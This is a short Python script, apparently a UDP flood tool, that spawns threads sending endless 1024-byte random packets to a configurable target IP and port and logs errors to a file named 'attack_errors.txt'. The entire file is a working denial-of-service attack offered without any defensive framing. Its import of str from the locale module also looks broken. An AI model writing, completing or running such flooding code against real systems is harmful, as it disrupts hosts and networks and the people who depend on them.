#!/usr/local/bin/python3
import random
import socket
import threading
from locale import str

ip = ""
port = 80
choice = "UDP"
times = 1
threads = 1
file_txt = open("attack_errors.txt", 'a')


def floodUDP():
    j = True
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (ip, port)
            for x in range(times):
                s.sendto(data, address)
                if j == True:
                    file_txt.writelines("Sent packets.\n")
                    j = False
        except Exception as e:
            file_txt.write(str(e))
            file_txt.write("\n")
            break


for y in range(threads):
    if(choice == "UDP"):
        th = threading.Thread(target=floodUDP)
        th.start()
    else:
        print("Wrong input given")
